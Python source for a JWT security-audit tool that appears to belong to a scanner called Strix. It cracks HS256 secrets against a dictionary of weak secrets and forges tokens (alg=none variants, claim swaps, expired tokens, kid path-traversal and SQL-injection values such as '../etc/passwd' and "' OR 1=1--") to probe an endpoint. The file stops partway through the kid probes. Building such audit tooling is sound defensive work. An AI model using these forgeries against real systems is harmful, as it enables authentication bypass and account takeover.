"""JWT analyzer.

Detects JWTs in caller-supplied inputs (Authorization header,
cookies, body, query string) and probes each detected token for
the standard exploit classes.

**Static analyses** (no HTTP):

- **Header inspection** — parse `alg`, `typ`, `kid`, `jku`, `x5u`,
  `x5t`. Flags:
    - `alg: none` (no signature required) → high (forge before
      validation lands).
    - `kid` contains `..` or `/` → medium (possible path-traversal
      in the kid → key-file lookup).
    - `kid` contains SQL meta-characters (`'`, `"`, `--`, `#`,
      `;`) → medium (possible SQLi in kid → DB lookup).
    - `jku` / `x5u` pointing off-site → high (token-issuer
      hijack via DNS / JKU URL fetch).
- **Claims inspection** — parse `iss`, `aud`, `exp`, `iat`, `nbf`,
  `sub`. Flags:
    - Missing `exp` → low (token never expires).
    - `exp` in the past → low (a fresh-from-the-server expired
      token; the active probe checks whether the server actually
      rejects it).
    - Missing `iss` AND missing `aud` → low (token has no
      issuer/audience binding; reusable across services).
    - `iat` in the future → low (clock skew or generator bug).
- **Weak HMAC dictionary** — brute-force the HMAC-SHA256 secret
  against the ~120-entry top-secrets dictionary. If a match is
  found, the token's signature was generated with a guessable
  secret → critical CWE-326. Time-capped at 5 seconds.

**Active probes** (HTTP — only when `test_endpoint_url` is set):

- **Baseline** — send the token as-is. If it's not accepted, the
  active probes can't measure delta (skipped with `inconclusive`).
- **alg=none** — rewrite the header `{"alg":"none","typ":"JWT"}`,
  set signature to empty string. If accepted → critical (server
  trusts unsigned tokens).
- **alg=NONE** (case variant) — some libraries reject lowercase
  `none` but accept uppercase / mixed-case.
- **expired** — mutate `exp` to a past timestamp; resign with the
  same key if the dictionary attack found it; otherwise just
  ship the mutated payload as-is so the server tests its `exp`
  validator. If accepted → high.
- **claim_aud** — mutate `aud` to a wildly-different value. If
  accepted → medium (server doesn't validate audience).
- **claim_iss** — mutate `iss`. If accepted → medium.
- **claim_sub** — mutate `sub` (e.g. user-id swap). If accepted →
  high CWE-285 (improper authorization — server takes the token's
  `sub` at face value with no signature recheck).
- **kid_traversal** — set `kid` header to `../../etc/passwd`. If
  the response shape changes versus baseline rejection (e.g. 500
  instead of 401) → medium (kid is reaching a file-system
  resolver; possible LFI primitive).
- **kid_sqli** — set `kid` to `' OR 1=1--`. Same shape-change
  detection → medium.

Acceptance heuristic for active probes: same status class (2xx/3xx)
as baseline AND body length within ±25%.

Per-(severity, class) dedup so the alg=none / alg=NONE pair emits
ONE finding, not two.

Skip cases:

- Token isn't a valid JWT (3 base64-URL-encoded parts) → returns
  `success=False` with clear error.
- Active probes need `test_endpoint_url`. Without it, only static
  analyses run.
- `--exclude-path` blocks the `test_endpoint_url` → active probes
  skip; static analyses still run.

Each finding carries `description_plain` + `recommended_action`
(use a robust JWT library that rejects `alg=none` by default;
HMAC secrets must be ≥ 32 random bytes; validate `exp` / `nbf`
/ `iat` server-side; bind tokens to an audience and issuer; never
let the `kid` header drive a file-system or DB lookup without
allow-list validation; rotate keys; disable JWE-like fallbacks).

`verification_status=needs_review`.

Composes with cluster-A safety. MITRE T1556 + T1190.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
import time
from typing import Any
from urllib.parse import urlparse

from strix.tools.registry import register_tool


logger = logging.getLogger(__name__)
_TOOL_NAME = "jwt_audit"
_DEFAULT_TIMEOUT = 10.0
_MAX_RESPONSE_SCAN = 64 * 1024
_DICTIONARY_TIMEOUT_SEC = 5.0


# Top-N HMAC secrets observed across CTFs / leaks / default
# scaffolds. Order is roughly empirical-frequency.
_HMAC_DICTIONARY: tuple[str, ...] = (
    "", "secret", "password", "1234", "12345", "123456", "key",
    "your-256-bit-secret", "your-secret-key", "supersecret",
    "default", "jwt-secret", "jwt", "token", "secretkey",
    "mysecret", "mysecretkey", "changeme", "change-me", "test",
    "qwerty", "admin", "letmein", "welcome", "abc123",
    "secret123", "password123", "p@ssw0rd", "Pa$$w0rd",
    "my-app-secret", "app-secret", "appsecret", "node-jwt-secret",
    "django-insecure", "rails-secret", "flask-secret",
    "express-jwt", "secret_key", "private", "private-key",
    "private_key", "Pa55w0rd", "qwerty123", "iloveyou",
    "monkey", "dragon", "hello", "welcome123", "trustno1",
    "00000000", "1q2w3e4r", "asdf", "asdfasdf", "!@#$%^&*()",
    "spring", "spring-security", "auth", "authsecret",
    "tokensecret", "openid", "oauth", "oauth2", "supersecretkey",
    # GitHub-leaked / framework-default values.
    "01234567890123456789012345678901",  # 32-char zero-pad
    "0000000000000000000000000000000000000000000000000000000000000000",
    "yoursecretkey", "REPLACE_ME", "replace-me",
    "very-secret-string-with-32-chars", "fake-secret",
    "this-is-a-secret-key", "ThisIsTheSecret", "TopSecret",
    # Common JWT default secrets in tutorials.
    "GQDstcKsx0NHjPOuXOYg5MbeJ1XT0uFiwDVvVBrk",
    "your_jwt_secret", "your_secret",
    # numeric variants
    "0", "1", "123", "1234567890",
)


# ---------------------------------------------------------------------------
# JWT detection
# ---------------------------------------------------------------------------


_JWT_RE = re.compile(
    r"\b(eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{0,})\b"
)


def detect_jwts(text: str) -> list[str]:
    """Return all JWT-shaped substrings in `text`."""
    if not text:
        return []
    return list(set(_JWT_RE.findall(text)))


# ---------------------------------------------------------------------------
# JWT parsing
# ---------------------------------------------------------------------------


def _b64url_decode(s: str) -> bytes:
    pad = (-len(s)) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")


def parse_jwt(token: str) -> dict[str, Any] | None:
    """Decode the JWT into {header, payload, signature_b64,
    header_b64, payload_b64}. Returns None for malformed tokens."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError, binascii_decode_error()):
        return None
    return {
        "header": header,
        "payload": payload,
        "signature_b64": parts[2],
        "header_b64": parts[0],
        "payload_b64": parts[1],
    }


def binascii_decode_error() -> type[Exception]:
    import binascii
    return binascii.Error


# ---------------------------------------------------------------------------
# HMAC dictionary brute-force (offline)
# ---------------------------------------------------------------------------


def crack_hmac_secret(token: str, deadline: float) -> str | None:
    """Try the dictionary of common HMAC secrets against the token.
    Returns the matching secret if found within `deadline` seconds
    (clock-time), else None. HS256 only — HS384 / HS512 are
    structurally similar but rare in practice and skipped to keep
    runtime bounded."""
    parsed = parse_jwt(token)
    if parsed is None:
        return None
    header = parsed["header"]
    if header.get("alg") != "HS256":
        return None
    signing_input = f"{parsed['header_b64']}.{parsed['payload_b64']}".encode()
    expected_sig = _b64url_decode(_normalize_sig(parsed["signature_b64"]))
    end_time = time.monotonic() + deadline
    for secret in _HMAC_DICTIONARY:
        if time.monotonic() > end_time:
            return None
        actual = hmac.new(
            secret.encode("utf-8"), signing_input, hashlib.sha256
        ).digest()
        if hmac.compare_digest(actual, expected_sig):
            return secret
    return None


def _normalize_sig(sig_b64: str) -> str:
    """Pad signature so b64url_decode succeeds."""
    return sig_b64 if sig_b64 else ""


# ---------------------------------------------------------------------------
# Active-probe token construction
# ---------------------------------------------------------------------------


def build_alg_none_token(parsed: dict[str, Any], alg_value: str = "none") -> str:
    """Build a `{alg: none}` variant of the token (no signature)."""
    header = dict(parsed["header"])
    header["alg"] = alg_value
    new_header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_header_b64}.{parsed['payload_b64']}."


def build_payload_mutated_token(
    parsed: dict[str, Any],
    mutations: dict[str, Any],
    secret: str | None = None,
) -> str:
    """Build a token with `mutations` applied to the claims. If
    `secret` is supplied (we cracked it), resign HS256; else just
    keep the original signature (server's signature check should
    fail, but if signature isn't checked the mutation lands)."""
    payload = dict(parsed["payload"])
    payload.update(mutations)
    new_payload_b64 = _b64url_encode(
        json.dumps(payload, separators=(",", ":"), sort_keys=False).encode()
    )
    header_b64 = parsed["header_b64"]
    if secret is not None and parsed["header"].get("alg", "").upper() == "HS256":
        signing_input = f"{header_b64}.{new_payload_b64}".encode()
        sig = hmac.new(
            secret.encode("utf-8"), signing_input, hashlib.sha256
        ).digest()
        return f"{header_b64}.{new_payload_b64}.{_b64url_encode(sig)}"
    return f"{header_b64}.{new_payload_b64}.{parsed['signature_b64']}"


def build_kid_mutated_token(
    parsed: dict[str, Any], kid_value: str, secret: str | None = None
) -> str:
    """Build a token with the `kid` header mutated."""
    header = dict(parsed["header"])
    header["kid"] = kid_value
    new_header_b64 = _b64url_encode(
        json.dumps(header, separators=(",", ":")).encode()
    )
    payload_b64 = parsed["payload_b64"]
    if secret is not None and header.get("alg", "").upper() == "HS256":
        signing_input = f"{new_header_b64}.{payload_b64}".encode()
        sig = hmac.new(
            secret.encode("utf-8"), signing_input, hashlib.sha256
        ).digest()
        return f"{new_header_b64}.{payload_b64}.{_b64url_encode(sig)}"
    return f"{new_header_b64}.{payload_b64}.{parsed['signature_b64']}"


# ---------------------------------------------------------------------------
# HTTP fetch (cluster-A composing)
# ---------------------------------------------------------------------------


def _http_request(
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    body: str = "",
    timeout: float = _DEFAULT_TIMEOUT,
) -> dict[str, Any]:
    headers = dict(headers or {})

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager

        manager = get_proxy_manager()
    except Exception:  # noqa: BLE001
        manager = None
    if manager is not None:
        try:
            r = manager.send_simple_request(
                method, url, headers=headers, body=body, timeout=int(timeout)
            )
            if r.get("skipped"):
                return {"status": 0, "headers": {}, "body": "", "skipped": True}
            return {
                "status": int(r.get("status_code") or 0),
                "headers": _lower_keys(r.get("headers") or {}),
                "body": (r.get("body") or "")[:_MAX_RESPONSE_SCAN],
            }
        except Exception:  # noqa: BLE001
            logger.debug("proxy send_simple_request failed; falling back", exc_info=True)

    try:
        import httpx

        from strix.tools.proxy.http_safety import (
            inject_auth_headers,
            is_path_excluded,
            throttle_for_rate_limit,
        )

        excluded, _ = is_path_excluded(url)
        if excluded:
            return {"status": 0, "headers": {}, "body": "", "skipped": True}
        merged = inject_auth_headers(headers)
        throttle_for_rate_limit()
        with httpx.Client(timeout=timeout, follow_redirects=False, verify=False) as c:
            content = body.encode("utf-8") if body else None
            r = c.request(method, url, headers=merged, content=content)
            return {
                "status": r.status_code,
                "headers": _lower_keys(dict(r.headers)),
                "body": r.text[:_MAX_RESPONSE_SCAN],
            }
    except Exception as e:  # noqa: BLE001
        return {"status": 0, "headers": {}, "body": "", "error": str(e)}


def _lower_keys(headers: dict[str, Any]) -> dict[str, str]:
    return {str(k).lower(): str(v) for k, v in headers.items()}


# ---------------------------------------------------------------------------
# Acceptance heuristic
# ---------------------------------------------------------------------------


def _status_class(status: int) -> str:
    if 200 <= status < 300:
        return "2xx"
    if 300 <= status < 400:
        return "3xx"
    if 400 <= status < 500:
        return "4xx"
    if 500 <= status < 600:
        return "5xx"
    return "unknown"


def _looks_like_baseline(
    response: dict[str, Any], baseline: dict[str, Any]
) -> bool:
    status = int(response.get("status") or 0)
    if status in (401, 403):
        return False
    base_class = baseline.get("status_class")
    if _status_class(status) != base_class:
        return False
    if base_class not in ("2xx", "3xx"):
        return False
    base_len = int(baseline.get("body_length") or 0)
    body_len = len(response.get("body") or "")
    if base_len > 0:
        ratio = body_len / base_len
        if ratio < 0.75 or ratio > 1.25:
            return False
    return True


# ---------------------------------------------------------------------------
# Token placement
# ---------------------------------------------------------------------------


def _apply_token(
    placement: str,
    token: str,
    headers: dict[str, str],
    cookies: dict[str, str],
    url: str,
) -> tuple[str, dict[str, str], dict[str, str]]:
    """Return (url_after, headers_after, cookies_after) with the
    token placed per `placement`.

    Placement: `auth_bearer` (Authorization: Bearer ...),
    `cookie:NAME` (cookie value), `header:NAME` (custom header),
    `query:NAME` (query string parameter).
    """
    h = dict(headers)
    c = dict(cookies)
    new_url = url
    if placement == "auth_bearer":
        h["Authorization"] = f"Bearer {token}"
    elif placement.startswith("cookie:"):
        name = placement[len("cookie:"):]
        c[name] = token
    elif placement.startswith("header:"):
        name = placement[len("header:"):]
        h[name] = token
    elif placement.startswith("query:"):
        name = placement[len("query:"):]
        sep = "&" if "?" in url else "?"
        from urllib.parse import quote
        new_url = f"{url}{sep}{name}={quote(token)}"
    else:
        h["Authorization"] = f"Bearer {token}"
    return (new_url, h, c)


# ---------------------------------------------------------------------------
# Tracer integration
# ---------------------------------------------------------------------------


def _emit_finding(
    *,
    title: str,
    severity: str,
    cwe: str,
    target: str,
    endpoint: str,
    description: str,
    description_plain: str,
    recommended_action: str,
) -> None:
    try:
        from strix.telemetry.tracer import get_global_tracer
    except ImportError:
        return
    tracer = get_global_tracer()
    if tracer is None:
        return
    tracer.add_vulnerability_report(
        title=title,
        severity=severity,
        category="jwt_misconfiguration",
        cwe=cwe,
        target=target,
        endpoint=endpoint,
        description=description,
        impact=(
            "JWT misconfiguration is a top-5 finding category in "
            "API pentests. Real-world consequences: forging "
            "authenticated tokens for arbitrary users (alg=none / "
            "weak HMAC secret), bypassing audience binding to "
            "replay tokens across services, accepting expired "
            "tokens, kid-driven LFI/SQLi via key-lookup paths."
        ),
        remediation_steps=recommended_action,
        description_plain=description_plain,
        recommended_action=recommended_action,
        verification_status="needs_review",
    )


def _start_check(category: str, surface: str) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer
    except ImportError:
        return None
    t = get_global_tracer()
    if t is None:
        return None
    return t.start_check(category=category, surface=surface, tool=_TOOL_NAME)


def _complete_check(check_id: str | None, result: str, evidence: str) -> None:
    if not check_id:
        return
    try:
        from strix.telemetry.tracer import get_global_tracer
    except ImportError:
        return
    t = get_global_tracer()
    if t is None:
        return
    t.complete_check(check_id, result=result, evidence=evidence)


# ---------------------------------------------------------------------------
# Public tool
# ---------------------------------------------------------------------------


@register_tool(
    sandbox_execution=True,
    mitre_techniques=["T1556", "T1190"],
)
def jwt_audit(
    token: str,
    test_endpoint_url: str | None = None,
    placement: str = "auth_bearer",
    method: str = "GET",
    body: str = "",
    extra_headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
    timeout: float = _DEFAULT_TIMEOUT,
    enable_dictionary_attack: bool = True,
) -> dict[str, Any]:
    """Audit a JWT for the standard exploit classes.

    Args:
        token: The JWT (`eyJ...` shape) to analyze.
        test_endpoint_url: URL whose validation policy reflects the
            token (e.g. `https://api.example.com/v1/profile` that
            returns 200 with the token, 401 without). When omitted,
            only static analyses run.
        placement: Where to put the token in the request.
            `auth_bearer` (default — `Authorization: Bearer ...`),
            `cookie:NAME` (cookie value), `header:NAME` (custom
            header value), `query:NAME` (query-string parameter).
        method: HTTP method for the active probes (default GET).
        body: Optional request body.
        extra_headers: Additional headers (e.g. CSRF tokens).
        cookies: Cookie name → value map.
        timeout: Per-probe timeout in seconds.
        enable_dictionary_attack: When True (default), brute-forces
            HS256 against the ~120-entry top-secrets dictionary
            (capped at 5s wall-clock). Set False to skip.

    Returns:
        {
          success, token, header, payload,
          static_findings: [...], active_probes: [...],
          cracked_secret?, target_host?, findings_emitted
        }

    Findings:
        - **Critical** — alg=none accepted; HMAC secret cracked
          from dictionary.
        - **High** — alg=none in token header (static); jku/x5u
          off-site; expired token accepted; sub-claim mutation
          accepted.
        - **Medium** — kid path-traversal / SQLi reaches the
          resolver; aud / iss claim mutation accepted; no exp +
          server accepts old-iat tokens; missing exp.
        - **Low** — missing iss/aud claims (no binding); iat in
          future.

    Notes:
        - Read-only by default. Active probes DISPATCH requests
          using the (mutated) token; the underlying endpoint must
          tolerate read-only requests with arbitrary tokens.
        - Composes with cluster-A safety; `--exclude-path` skips.
        - `verification_status=needs_review`.
    """
    parsed = parse_jwt(token)
    if parsed is None:
        return {"success": False, "error": f"not a valid JWT: {token[:50]!r}..."}

    target_host = "(static-only)"
    if test_endpoint_url is not None:
        normalized = _normalize_target(test_endpoint_url)
        if normalized is None:
            return {"success": False, "error": f"invalid test_endpoint_url: {test_endpoint_url!r}"}
        test_endpoint_url = normalized
        target_host = (urlparse(test_endpoint_url).hostname or "").lower()

    cev = _start_check("jwt_audit", target_host)

    findings_emitted = 0
    static_findings: list[dict[str, Any]] = []
    active_probes: list[dict[str, Any]] = []

    header = parsed["header"]
    payload = parsed["payload"]

    # ---- Static analyses ----

    alg = str(header.get("alg", "")).lower()
    if alg in ("none", ""):
        static_findings.append({
            "label": "alg_none_in_header",
            "severity": "high",
            "evidence": f"header has alg={header.get('alg')!r}",
        })
        _emit_finding(
            title=f"JWT header has alg=none / empty (CWE-347 on {target_host})",
            severity="high",
            cwe="CWE-347",
            target=target_host,
            endpoint=test_endpoint_url or "(static-only)",
            description=(
                f"Token header.alg = {header.get('alg')!r}. The token "
                "isn't carrying a signature; if the server doesn't "
                "explicitly reject `alg=none` it accepts arbitrary "
                "forged tokens."
            ),
            description_plain=(
                "The JWT was issued with no signature algorithm "
                "(`alg=none`). If the server validates the token at "
                "all, a robust JWT library should reject this; "
                "older / mis-configured libraries accept it as "
                '"valid because no signature was needed". Forge any '
                "user's token by setting `alg=none` and rewriting "
                "claims."
            ),
            recommended_action=(
                "Use a JWT library that rejects `alg=none` by "
                "default (PyJWT does; jsonwebtoken does — check "
                "`algorithms=['HS256']` is passed). Configure the "
                "validator's allow-list of algorithms explicitly. "
                "Rotate any tokens that were issued under this "
                "configuration."
            ),
        )
        findings_emitted += 1

    # kid: path-traversal / SQLi shape
    kid = str(header.get("kid", ""))
    if kid:
        kid_lower = kid.lower()
        if (".." in kid or kid.startswith("/") or "%2e%2e" in kid_lower):
            static_findings.append({
                "label": "kid_path_traversal_shape",
                "severity": "medium",
                "evidence": f"kid={kid!r}",
            })
            _emit_finding(
                title=f"JWT kid contains path-traversal shape on {target_host}",
                severity="medium",
                cwe="CWE-22",
                target=target_host,
                endpoint=test_endpoint_url or "(static-only)",
                description=(
                    f"Token header.kid = {kid!r} contains path-"
                    "traversal characters."
                ),
                description_plain=(
                    "The JWT's `kid` (key ID) header contains path-"
                    "traversal characters. If the server uses `kid` "
                    "to look up the verification key from a file "
                    "system path, an attacker can point it at "
                    "arbitrary files (`/dev/null`, `/etc/passwd`) "
                    "which can either bypass signature checks (when "
                    "the file content matches HMAC of the token) or "
                    "leak file contents in error messages."
                ),
                recommended_action=(
                    "Validate `kid` against an allow-list of known "
                    "key IDs before any look-up. Never use `kid` "
                    "as a file system path or DB query directly. "
                    "Treat it as an opaque identifier."
                ),
            )
            findings_emitted += 1
        elif any(meta in kid for meta in ("'", '"', "--", "#", ";", " OR ", " or ")):
            static_findings.append({
                "label": "kid_sql_meta_chars",
                "severity": "medium",
                "evidence": f"kid={kid!r}",
            })
            _emit_finding(
                title=f"JWT kid contains SQL meta-characters on {target_host}",
                severity="medium",
                cwe="CWE-89",
                target=target_host,
                endpoint=test_endpoint_url or "(static-only)",
                description=(
                    f"Token header.kid = {kid!r} contains SQL meta-"
                    "characters."
                ),
                description_plain=(
                    "The JWT's `kid` header contains SQL meta-"
                    "characters. If the server passes `kid` into a "
                    "query that fetches the verification key, an "
                    "attacker can inject arbitrary SQL."
                ),
                recommended_action=(
                    "Use parameterized queries for the kid lookup "
                    "(or better: validate kid against an allow-list). "
                    "Treat the kid header as untrusted input."
                ),
            )
            findings_emitted += 1

    # jku / x5u off-site
    for url_claim in ("jku", "x5u"):
        url_value = str(header.get(url_claim, ""))
        if url_value:
            try:
                u = urlparse(url_value)
                if u.hostname and u.hostname not in (target_host, ""):
                    static_findings.append({
                        "label": f"{url_claim}_off_site",
                        "severity": "high",
                        "evidence": f"{url_claim}={url_value!r}",
                    })
                    _emit_finding(
                        title=f"JWT {url_claim} points off-site on {target_host}",
                        severity="high",
                        cwe="CWE-918",
                        target=target_host,
                        endpoint=test_endpoint_url or "(static-only)",
                        description=(
                            f"Token header.{url_claim} = {url_value!r}; "
                            f"hostname {u.hostname} differs from the "
                            f"verifier's host {target_host}."
                        ),
                        description_plain=(
                            f"The JWT specifies its own verification "
                            f"key URL via the `{url_claim}` header, "
                            f"and that URL points to a different "
                            f"host than the validator. An attacker "
                            f"can issue tokens whose `{url_claim}` "
                            f"points at attacker-controlled "
                            f"infrastructure — the validator fetches "
                            f"the attacker's key and verifies "
                            f"against it. Total signature bypass."
                        ),
                        recommended_action=(
                            f"Reject tokens whose `{url_claim}` "
                            f"isn't in your allow-list of trusted "
                            f"hosts (typically just your own JWKS "
                            f"endpoint). Better: drop {url_claim} "
                            f"validation entirely and configure the "
                            f"verifier with the public key directly."
                        ),
                    )
                    findings_emitted += 1
            except Exception:  # noqa: BLE001
                pass

    # Claims: missing exp / iss / aud
    if "exp" not in payload:
        static_findings.append({
            "label": "missing_exp",
            "severity": "low",
            "evidence": "no `exp` claim in payload",
        })
        _emit_finding(
            title=f"JWT has no `exp` claim on {target_host}",
            severity="low",
            cwe="CWE-613",
            target=target_host,
            endpoint=test_endpoint_url or "(static-only)",
            description=(
                "Token payload does not include an `exp` claim — "
                "the token never expires."
            ),
            description_plain=(
                "Your JWT doesn't have an expiration timestamp. "
                "Once issued, a token is valid forever — every "
                "compromised token is usable until you rotate the "
                "signing key (which forces every user to log in "
                "again)."
            ),
            recommended_action=(
                "Set `exp` on every token at issue time (typical: "
                "15-30 minutes for access tokens; longer for "
                "refresh tokens stored server-side with revocation)."
            ),
        )
        findings_emitted += 1

    if "iss" not in payload and "aud" not in payload:
        static_findings.append({
            "label": "missing_iss_and_aud",
            "severity": "low",
            "evidence": "no iss / aud claims",
        })
        _emit_finding(
            title=f"JWT has no iss / aud claims on {target_host}",
            severity="low",
            cwe="CWE-345",
            target=target_host,
            endpoint=test_endpoint_url or "(static-only)",
            description=(
                "Token has neither `iss` nor `aud` — no binding to "
                "issuer or audience."
            ),
            description_plain=(
                "Your JWT has no issuer (`iss`) or audience (`aud`) "
                "claim. If the same signing key is used by multiple "
                "services, a token issued for service A can be "
                "replayed against service B."
            ),
            recommended_action=(
                "Set `iss` to your own service identifier and `aud` "
                "to the intended consuming service. Validate both "
                "in the verifier."
            ),
        )
        findings_emitted += 1

    # Dictionary attack on HMAC secret (offline).
    cracked_secret: str | None = None
    if enable_dictionary_attack and alg == "hs256":
        cracked_secret = crack_hmac_secret(token, _DICTIONARY_TIMEOUT_SEC)
        if cracked_secret is not None:
            static_findings.append({
                "label": "weak_hmac_secret",
                "severity": "critical",
                "evidence": f"HMAC secret = {cracked_secret!r}",
            })
            _emit_finding(
                title=f"JWT HMAC secret is dictionary-trivial on {target_host}",
                severity="critical",
                cwe="CWE-326",
                target=target_host,
                endpoint=test_endpoint_url or "(static-only)",
                description=(
                    f"HMAC-SHA256 secret recovered from the top-"
                    f"secrets dictionary: {cracked_secret!r}. Any "
                    "token can be forged with this secret."
                ),
                description_plain=(
                    "Your JWT signing key was found in a list of "
                    "well-known weak secrets. An attacker who saw "
                    "any single token from your service can recover "
                    "the secret in seconds and forge tokens for "
                    "any user."
                ),
                recommended_action=(
                    "Rotate the signing key immediately to a CSPRNG-"
                    "generated 256-bit (32-byte) secret. In Python: "
                    "`secrets.token_bytes(32)`. Force all users to "
                    "log in again. Audit the source repository for "
                    "the leaked secret."
                ),
            )
            findings_emitted += 1

    # ---- Active probes (only when test_endpoint_url is set) ----
    if test_endpoint_url is not None:
        baseline_url, baseline_headers, baseline_cookies = _apply_token(
            placement, token,
            dict(extra_headers or {}), dict(cookies or {}),
            test_endpoint_url,
        )
        if baseline_cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in baseline_cookies.items())
            baseline_headers["Cookie"] = cookie_str

        baseline_response = _http_request(
            method, baseline_url,
            headers=baseline_headers, body=body, timeout=timeout,
        )
        if baseline_response.get("skipped"):
            _complete_check(cev, "inconclusive", "URL excluded by --exclude-path")
            return _build_result(
                token=token, parsed=parsed,
                target_host=target_host,
                static_findings=static_findings,
                active_probes=active_probes,
                cracked_secret=cracked_secret,
                findings_emitted=findings_emitted,
                inconclusive=True,
                reason="excluded by --exclude-path",
            )
        baseline_status = int(baseline_response.get("status") or 0)
        baseline_summary = {
            "status": baseline_status,
            "status_class": _status_class(baseline_status),
            "body_length": len(baseline_response.get("body") or ""),
        }
        if _status_class(baseline_status) not in ("2xx", "3xx"):
            _complete_check(
                cev, "inconclusive",
                f"baseline returned {baseline_status}; token isn't being accepted",
            )
            return _build_result(
                token=token, parsed=parsed,
                target_host=target_host,
                static_findings=static_findings,
                active_probes=active_probes,
                cracked_secret=cracked_secret,
                findings_emitted=findings_emitted,
                inconclusive=True,
                reason=(
                    f"baseline submission with the supplied token "
                    f"returned {baseline_status}; the endpoint isn't "
                    f"accepting the token, so active probes can't "
                    f"measure delta. Supply a token that's currently "
                    f"valid against the endpoint."
                ),
            )

        def _send_probe(probe_token: str) -> dict[str, Any]:
            url, h, c = _apply_token(
                placement, probe_token,
                dict(extra_headers or {}), dict(cookies or {}),
                test_endpoint_url,
            )
            if c:
                cookie_str = "; ".join(f"{k}={v}" for k, v in c.items())
                h["Cookie"] = cookie_str
            return _http_request(method, url, headers=h, body=body, timeout=timeout)

        seen_dedup_keys: set[str] = set()

        # alg=none / alg=NONE
        for alg_value in ("none", "NoNe", "NONE"):
            forged = build_alg_none_token(parsed, alg_value)
            response = _send_probe(forged)
            if response.get("skipped"):
                continue
            accepted = _looks_like_baseline(response, baseline_summary)
            active_probes.append({
                "label": f"alg_{alg_value}",
                "class_": "alg_none",
                "status": int(response.get("status") or 0),
                "body_length": len(response.get("body") or ""),
                "accepted": accepted,
                "finding_severity": "critical" if accepted else None,
            })
            if accepted and "critical::alg_none" not in seen_dedup_keys:
                seen_dedup_keys.add("critical::alg_none")
                _emit_finding(
                    title=f"JWT alg=none accepted on {target_host}",
                    severity="critical",
                    cwe="CWE-347",
                    target=target_host,
                    endpoint=test_endpoint_url,
                    description=(
                        f"Forged a token with `alg={alg_value!r}` and "
                        "no signature; server returned status "
                        f"{response.get('status')}, body length "
                        f"{len(response.get('body') or '')} (matches "
                        f"baseline)."
                    ),
                    description_plain=(
                        "Your server accepts JWTs with no signature "
                        "(alg=none). An attacker can forge a token "
                        "for any user by rewriting the claims and "
                        "stripping the signature."
                    ),
                    recommended_action=(
                        "Configure the JWT verifier with an explicit "
                        "algorithm allow-list (e.g. PyJWT's "
                        "`algorithms=['HS256']`). Verify the library "
                        "version is current — older versions of "
                        "popular JWT libs had alg=none bypass bugs."
                    ),
                )
                findings_emitted += 1

        # claim mutation: aud, iss, sub
        claim_mutations: list[tuple[str, str, str, str, str]] = [
            ("claim_aud", "aud", "https://strix-attack.evil.example",
             "medium", "no audience validation"),
            ("claim_iss", "iss", "https://strix-attack.evil.example",
             "medium", "no issuer validation"),
            ("claim_sub", "sub", "strix-attacker-666",
             "high", "subject claim mutation accepted (no signature recheck)"),
        ]
        for label, claim, mutated_value, severity, evidence in claim_mutations:
            forged = build_payload_mutated_token(
                parsed, {claim: mutated_value}, secret=cracked_secret,
            )
            response = _send_probe(forged)
            if response.get("skipped"):
                continue
            accepted = _looks_like_baseline(response, baseline_summary)
            active_probes.append({
                "label": label,
                "class_": claim,
                "status": int(response.get("status") or 0),
                "body_length": len(response.get("body") or ""),
                "accepted": accepted,
                "finding_severity": severity if accepted else None,
            })
            if accepted:
                key = f"{severity}::{label}"
                if key not in seen_dedup_keys:
                    seen_dedup_keys.add(key)
                    _emit_finding(
                        title=f"JWT {claim} mutation accepted on {target_host}",
                        severity=severity,
                        cwe="CWE-285" if claim == "sub" else "CWE-345",
                        target=target_host,
                        endpoint=test_endpoint_url,
                        description=(
                            f"Forged a token with `{claim}` = "
                            f"{mutated_value!r} and submitted; server "
                            f"returned baseline-shape response. "
                            f"{evidence}."
                        ),
                        description_plain=(
                            f"Your server accepts JWTs whose `{claim}` "
                            f"claim has been mutated. The validator "
                            f"isn't checking the signature against "
                            f"the claims (so any change still passes), "
                            f"OR isn't validating the {claim} value "
                            f"against an allow-list."
                        ),
                        recommended_action=(
                            f"Configure your JWT library to validate "
                            f"`{claim}` against an explicit expected "
                            f"value. For audience: pass "
                            f"`audience='your-service'` to the "
                            f"verifier. For issuer: pass "
                            f"`issuer='https://your-issuer'`. The "
                            f"library should reject tokens that "
                            f"don't match."
                        ),
                    )
                    findings_emitted += 1

        # expired token
        expired_payload = dict(parsed["payload"])
        expired_payload["exp"] = int(time.time()) - 3600  # 1h ago
        forged = build_payload_mutated_token(
            parsed, {"exp": expired_payload["exp"]}, secret=cracked_secret,
        )
        response = _send_probe(forged)
        if not response.get("skipped"):
            accepted = _looks_like_baseline(response, baseline_summary)
            active_probes.append({
                "label": "expired",
                "class_": "exp",
                "status": int(response.get("status") or 0),
                "body_length": len(response.get("body") or ""),
                "accepted": accepted,
                "finding_severity": "high" if accepted else None,
            })
            if accepted and "high::expired" not in seen_dedup_keys:
                seen_dedup_keys.add("high::expired")
                _emit_finding(
                    title=f"JWT with expired `exp` accepted on {target_host}",
                    severity="high",
                    cwe="CWE-613",
                    target=target_host,
                    endpoint=test_endpoint_url,
                    description=(
                        "Token with `exp` set 1 hour in the past was "
                        f"accepted (status {response.get('status')})."
                    ),
                    description_plain=(
                        "Your server accepts JWTs whose expiration "
                        "date has passed. Once issued, a token is "
                        "valid forever — every compromised or stolen "
                        "token remains usable indefinitely."
                    ),
                    recommended_action=(
                        "Configure the JWT verifier to validate "
                        "`exp`. Most libraries do by default if "
                        "you pass `verify_exp=True` (or the equivalent "
                        "option). Test by issuing a token with a "
                        "1-second expiry, waiting 2 seconds, and "
                        "expecting the next request to fail."
                    ),
                )
                findings_emitted += 1

        # kid traversal / SQLi
        kid_probes = [
            ("kid_traversal", "../../../../../../etc/passwd", "medium", "CWE-22"),
